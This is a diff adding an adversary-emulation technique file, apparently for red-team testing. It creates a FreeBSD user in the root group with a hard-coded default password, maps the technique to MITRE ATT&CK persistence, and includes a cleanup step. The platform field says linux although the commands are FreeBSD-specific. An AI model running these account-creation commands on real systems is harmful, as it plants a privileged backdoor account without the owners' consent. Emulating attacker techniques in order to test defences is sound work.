@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: Create a new user in FreeBSD with `root` GID.
+description: |
+    Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
+args:
+    - name: username
+      type: string
+      default: butter
+    - name: password
+      type: string
+      default: BetterWithButter
+uuid: d141afeb-d2bc-4934-8dd5-b7dba0f9f67a
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1136: Create Account'
+    subtechniques:
+        - 'T1136.001: Local Account'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: create-a-new-user-in-freebsd-with-`root`-gid.
+      inline: |
+        pw useradd {{.Args.username}} -g 0 -d /root -s /bin/sh
+        echo "{{.Args.password}}" | pw usermod {{.Args.username}} -h 0
+      executor: sh
+      cleanup:
+        inline: |
+            pw userdel {{.Args.username}}
+        executor: sh
